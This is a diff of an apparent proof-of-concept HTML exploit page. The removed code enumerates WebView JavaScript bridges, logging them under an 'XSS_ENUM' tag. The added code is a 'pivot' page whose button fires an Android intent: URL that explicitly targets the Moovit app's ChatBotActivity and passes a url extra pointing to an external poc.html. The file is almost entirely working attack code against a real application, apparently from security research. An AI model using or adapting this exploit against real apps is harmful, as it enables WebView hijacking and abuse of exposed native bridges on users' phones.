@@ -1,74 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interface Enumerator</title>
-    <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
-        h3 { border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .bridge { color: #ff00ff; font-weight: bold; margin-bottom: 5px; }
-        .method { color: #ffffff; margin-left: 20px; font-size: 0.9em; display: block;}
-    </style>
-</head>
+<html>
 <body>
-    <h3>Scanning Window Object...</h3>
-    <div id="output">Analyzing...</div>
-
+    <h1>Attempting to Pivot...</h1>
+    <button onclick="launchChatBot()">Click to Launch ChatBot Activity</button>
+    
     <script>
-        // 1. List of standard globals to ignore to reduce noise
-        const ignoreList = new Set([
-            "window", "self", "document", "name", "location", "customElements", "history",
-            "locationbar", "menubar", "personalbar", "scrollbars", "statusbar", "toolbar",
-            "status", "closed", "frames", "length", "top", "opener", "parent", "frameElement",
-            "navigator", "origin", "external", "screen", "innerWidth", "innerHeight", "scrollX",
-            "pageXOffset", "scrollY", "pageYOffset", "visualViewport", "screenX", "screenY",
-            "outerWidth", "outerHeight", "devicePixelRatio", "clientInformation", "styleMedia",
-            "onanimationend", "onsearch", "isSecureContext", "performance", "console", "alert",
-            "confirm", "prompt", "print", "queueMicrotask", "requestAnimationFrame",
-            "cancelAnimationFrame", "captureEvents", "releaseEvents", "requestIdleCallback",
-            "cancelIdleCallback", "getComputedStyle", "matchMedia", "moveTo", "moveBy",
-            "resizeTo", "resizeBy", "scroll", "scrollTo", "scrollBy", "getSelection", "find",
-            "fetch", "btoa", "atob", "setTimeout", "clearTimeout", "setInterval", "clearInterval",
-            "createImageBitmap", "close", "focus", "blur", "postMessage", "caches", "cookieStore",
-            "crypto", "indexedDB", "localStorage", "sessionStorage", "speechSynthesis",
-            "trustedTypes", "undefined", "NaN", "Infinity"
-        ]);
-
-        let results = "";
+        function launchChatBot() {
+            // We attempt to call the ChatBotActivity explicitly.
+            // We pass a 'url' extra in case the parent class accepts it (common in Moovit apps).
+            
+            var target = "intent:#Intent;" + 
+                         "component=com.tranzmate/com.moovit.app.chatbot.ChatBotActivity;" + 
+                         "S.url=https://www.gelo.gg/poc.html;" + 
+                         "end";
+                         
+            window.location.href = target;
+        }
         
-        // 2. Iterate over window properties
-        for (let prop in window) {
-            // Filter out standard globals, event handlers (on...), and webkit internals
-            if (!ignoreList.has(prop) && !prop.startsWith("on") && !prop.startsWith("webkit")) {
-                
-                try {
-                    let type = typeof window[prop];
-                    
-                    // Bridges usually show up as 'object'
-                    results += `<div class="bridge">[+] FOUND: window.${prop} <span style="color:#888">(${type})</span></div>`;
-                    
-                    // 3. (Optional) Try to list methods inside the object
-                    if (type === 'object') {
-                        for (let key in window[prop]) {
-                            results += `<span class="method"> -> ${key}</span><br>`;
-                        }
-                    }
-                    
-                    // Log to ADB just in case UI is hidden
-                    console.log("XSS_ENUM: Found " + prop);
-                    
-                } catch(e) {
-                    results += `<div class="bridge">[!] Error accessing ${prop}</div>`;
-                }
-            }
-        }
-
-        if (results === "") {
-            document.getElementById("output").innerHTML = "No non-standard interfaces found.";
-        } else {
-            document.getElementById("output").innerHTML = results;
-        }
+        // Auto-trigger for convenience (optional)
+        // setTimeout(launchChatBot, 1000);
     </script>
 </body>
 </html>
